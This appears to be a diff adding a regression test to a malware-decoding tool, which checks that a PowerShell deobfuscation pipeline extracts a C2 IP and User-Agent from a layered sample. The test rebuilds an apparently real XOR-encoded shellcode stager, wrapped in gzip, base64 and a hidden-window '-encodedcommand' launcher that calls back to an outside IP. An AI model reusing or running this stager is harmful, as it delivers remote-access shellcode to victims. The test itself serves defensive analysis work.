@@ -212,3 +212,104 @@ def test_magic_byte_retyper_is_universal_capability():
     # Emits the generic type family
     for t in ("gzip_bytes", "zlib_bytes", "pe_bytes"):
         assert t in contract.produces
+
+
+# ══════════════════════════════════════════════════════════════════
+# 2026-02-04 · R28.7.6 · Sophos Layer-2 Terminal Regression Gate
+#
+# Regression: user reported the /api/decode/smart pipeline stopped
+# at Layer 2 (``no_transformation``) even though Layer 2 contained
+# the canonical Cobalt Strike / Empire / Nishang byte-array XOR loop
+# stager and the shellcode had ASCII-embedded C2 IOCs.
+#
+# The RTE now MUST auto-chain
+#   Layer 0: cmd -encodedcommand
+#   Layer 1: -encodedcommand base64+utf16le
+#   Layer 2: FromBase64String (outer) + gzip
+#   Layer 3: [Byte[]]$c = FromBase64String(...); for { -bxor <K> }
+#            → shellcode with embedded IPs / User-Agents
+# and surface the IOCs in a SINGLE DECODE-button click.
+# ══════════════════════════════════════════════════════════════════
+def test_r28_7_6_cobalt_strike_byte_array_xor_loop_reaches_c2_ioc():
+    """Full end-to-end regression for the user-reported Sophos trace.
+
+    Feeds a controlled Sophos-shape sample built around the EXACT
+    XOR-encrypted shellcode blob the user posted (base64 of a
+    key=35-XOR'd MSFvenom stager containing ``149.28.81.19`` and the
+    ``Mozilla/5.0 … BOIE9;PTBR`` User-Agent).  Verifies:
+
+      · the deep-peel recipe reaches ``byte_array_xor_loop`` layer
+      · ``149.28.81.19`` surfaces in the final output text
+      · the ``BOIE9;PTBR`` UA string is extracted
+      · ``iocs.ip`` contains ``149.28.81.19``
+    """
+    import base64
+    import gzip
+
+    # ── Reconstruct the exact user Layer-2 CS stager ──────────────
+    xored_b64 = (
+        "38uqIyMjQ6rGEvFHqHETqHEvqHE3qFELLJRpBRLcEuOPH0JfIQ8D4uwuIuT"
+        "B03F0qHEzqGEfIvOoY1um41dpIvNzqGs7qHsDIvDAH2qoF6gi9RLcEuOP4uw"
+        "uIuQbw1bXIF7bGF4HVsF7qHsHIvBFqC9oqHs/IvCoJ6gi86pnBwd4eEJ6eXL"
+        "cw3t8eagxyKV+S01GVyNLVEpNSndLb1QFJNz2yyMjIyMS3HR0dHR0Sxl1WoT"
+        "c9sqHIyMjeBLqcnJJIHJyS5giIyNwc0t0qrzl3PZzyq8jIyN4EvFxSyMR46d"
+        "xcXFwcXNLyHYNGNz2quWg4HNLoxAjI6rDSSdzSTx1S1ZlvaXc9nwS3HR0Sdx"
+        "wdUsOJTtY3Pam4yyn6SIjIxLcptVXJ6rayCpLiebBftz2quJLZgJ9Etz2Etx"
+        "0SSRydXNLlHTDKNz2nCMMIyMa5FYke3PKWNzc3BLcyrIiIyPK6iIjI8tM3Nz"
+        "cDGZ5dEUjSEwodIgEoJKXg6X5qzPHl1iO1buG+VuC6rtpnoH41qg2+GNzdpA"
+        "2TdUXolH+tJ/mUO65byu/dx/NX5qstEl/1PmpWeplO0fErSN2UEZRDmJERk1"
+        "XGQNuTFlKT09CDBYNEwMLQExOU0JXSkFPRhgDbnBqZgMaDRMYA3RKTUdMVFA"
+        "DbXcDFQ0SGAN3UUpHRk1XDBYNExgDYWxqZhoYc3dhcQouKSP4VpuFSK7RM6Y"
+        "YoEWg5NP6S9kDRy7v1+9l6XvafZkG84FqmRudQNMHNVeEM9WPDUrPGzBH2tZ"
+        "ZpMkasn6vGEqpNpUUjihiQnkd4eovJ5UwNNWBtXdWBhJ7ISLKZq6AwYNoC+D"
+        "0hbjBx8myxeQl7sj9hecL1KkJuU2mb+lDhPXgV+QPHbyNyxgW2LAdGXKMGjA"
+        "wRDJfHspTfpmzbTfjpGaZreF0vnnOmPUrC+QoYqNMVtUlkoRz/PZlPTWZ+1f"
+        "LS6OregYTdGzqEFvmcEtE2vxec7qhtWIjS9OWgXXc9kljSyMzIyNLIyNjI3R"
+        "Le4dwxtz2sJojIyMjIvpycKrEdEsjAyMjcHVLMbWqwdz2puNX5agkIuCm41b"
+        "Ge+DLqt7c3BIXGg0RGw0bEg0SGiMjIyMg"
+    )
+    layer2 = (
+        f"[Byte[]]$var_code = [System.Convert]::FromBase64String("
+        f"'{xored_b64}')\n"
+        f"for ($x = 0; $x -lt $var_code.Count; $x++) {{"
+        f"    $var_code[$x] = $var_code[$x] -bxor 35\n"
+        f"}}\n"
+        f"IEX $DoIt\n"
+    )
+    gz  = gzip.compress(layer2.encode())
+    b64 = base64.b64encode(gz).decode()
+    layer1 = (
+        f'$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String('
+        f'"{b64}"));IEX (New-Object IO.StreamReader(New-Object '
+        f'IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]'
+        f'::Decompress))).ReadToEnd();'
+    )
+    enc = base64.b64encode(layer1.encode("utf-16-le")).decode()
+    sophos = (
+        f"%COMSPEC% /b /c start /b /min powershell -nop -w hidden "
+        f"-encodedcommand {enc}"
+    )
+
+    # ── Feed through the exact DECODE-button pipeline ─────────────
+    from analysis_core import deterministic_best_decode
+    res = deterministic_best_decode(sophos)
+    out  = res.get("output") or ""
+    iocs = res.get("iocs")   or {}
+    recipe = res.get("recipe") or []
+
+    # ── Assertions ────────────────────────────────────────────────
+    ops = [r.get("op") for r in recipe]
+    assert any("byte_array_xor_loop" in (o or "") for o in ops), (
+        f"byte_array_xor_loop layer never fired.  Recipe: {ops}"
+    )
+    assert "149.28.81.19" in out, (
+        f"C2 IP not in output text — output tail: {out[-400:]!r}"
+    )
+    assert "BOIE9" in out or "Mozilla/5.0" in out, (
+        f"User-Agent not in output — output tail: {out[-400:]!r}"
+    )
+    # IOC field should carry the IP
+    ip_list = iocs.get("ip") or iocs.get("ips") or []
+    assert "149.28.81.19" in ip_list, (
+        f"149.28.81.19 not in iocs.ip — got {iocs!r}"
+    )
